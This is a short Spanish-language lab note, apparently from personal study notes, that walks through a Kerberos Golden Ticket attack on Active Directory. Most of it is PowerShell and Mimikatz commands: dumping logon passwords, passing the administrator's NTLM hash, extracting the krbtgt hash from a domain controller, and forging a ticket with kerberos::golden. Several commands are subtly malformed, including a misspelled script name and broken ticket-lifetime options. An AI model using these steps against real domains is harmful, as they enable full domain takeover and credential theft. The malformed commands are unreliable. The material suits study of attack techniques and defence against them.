
Esta técnica se trata de un ataque que intenta conseguir acceso casi ilimitado a un dominio de una organización mediante los datos de usuario almacenados en el AD. Explota las vulnerabilidades de autenticación de kerberos permitiendo al atacante hacer un bypass del autenticador.

Veamos un ejemplo practico:

Ejecutar powershell como administrador.

```powershell
cd C:\tools
powershell -ep bypass
. .\PowerView.ps1
. .\Incoke-Mimikatz.ps1

Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

![[Pasted image 20250404091344.png]]

Importante del administrador apuntar:
1. SID
2. NTLM

Procedemos con un pass-the-hash attack

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:hash"'

#Esto nos abre un command prompt como administrador. y pasamos los comapdos a este prompt

powershell
cd C:\Tools
powershell -ep bypass
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername prod.research.security.local
```

![[Pasted image 20250404092026.png]]

El importante a anotar es el krbtgt (kerberos tgt).

Pasamos al primer powershell abierto.

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:research.security.local /sid:SID /krbtgt:TGT id:500 /groups:512 /staroffset ending:600 /renewmax:10080 /ptt"'
```

Los valores de id y de groups los hemos puesto así porque es el standard, puede variar.

![[Pasted image 20250404092452.png]]

![[Pasted image 20250404092610.png]]

